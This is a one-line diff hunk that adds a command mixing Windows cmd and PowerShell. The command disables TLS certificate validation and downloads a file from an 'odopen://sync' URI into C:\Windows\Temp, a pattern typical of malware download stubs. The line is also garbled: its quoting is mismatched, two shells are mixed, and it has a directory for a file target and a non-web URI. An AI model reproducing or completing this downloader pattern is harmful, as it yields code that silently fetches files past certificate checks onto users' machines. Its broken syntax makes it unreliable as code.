@@ -1,0 +1,1 @@
+start "C:\Windows\Temp\" -o"C:\""[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('odopen://sync', 'C:\Windows\Temp\')"
